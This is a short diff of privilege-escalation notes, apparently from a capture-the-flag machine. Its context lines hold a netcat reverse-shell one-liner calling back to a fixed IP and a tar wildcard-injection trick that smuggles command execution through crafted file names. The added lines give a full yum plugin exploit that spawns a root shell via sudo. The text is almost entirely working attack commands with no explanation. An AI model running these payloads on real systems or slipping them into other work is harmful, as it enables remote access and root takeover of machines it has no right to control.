@@ -54,3 +54,27 @@ tar cf /home/milesdyson/backups/backup.tgz *
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.4.164 1234 >/tmp/f" > shell.sh
 touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
 touch "/var/www/html/--checkpoint=1"
+
+# yum exploit
+cd /dev/shm
+mkdir temp; cd temp
+
+nano x
+[main]
+plugins=1
+pluginpath=/dev/shm/temp
+pluginconfpath=/dev/shm/temp
+
+nano y.conf
+[main]
+enabled=1
+
+nano y.py
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/sh','/bin/sh')
+
+sudo yum -c x --enableplugin=y
